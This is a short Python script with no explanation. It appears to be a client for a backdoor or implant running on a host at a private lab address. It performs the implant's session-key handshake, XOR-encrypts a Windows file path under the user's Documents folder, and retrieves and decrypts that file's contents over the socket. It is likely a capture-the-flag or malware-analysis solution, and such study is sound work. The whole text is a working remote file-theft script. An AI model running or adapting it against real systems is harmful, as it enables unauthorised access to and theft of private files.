#!/usr/bin/env python3
import socket
import struct
import hashlib

def p32(i):
    return struct.pack('<I', i)

def u32(i):
    return struct.unpack('<I', i)[0]

HOST = '192.168.130.1'
PORT = 5566

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send(b"@")
    
session_key = s.recv(0x20)

hash_session_key = hashlib.md5(session_key).digest().hex().encode()

print(f"session key: {session_key}")
print(f"md5: {hash_session_key}")

path = b"C:\\Users\\pt\\Documents\\transcript.txt"

enc_path = []
for i in range(len(path)):
    enc_path.append(path[i] ^ hash_session_key[i % len(hash_session_key)])
enc_path = bytes(enc_path)

s.send(p32(len(enc_path)))
s.send(enc_path)

try:
    while True:
        rlen = u32(s.recv(4))
        data = s.recv(rlen)

        dec_data = []
        for i in range(len(data)):
            dec_data.append(data[i] ^ hash_session_key[i % len(hash_session_key)])
        dec_data = bytes(dec_data)

        print(dec_data)
except:
    pass

s.close()
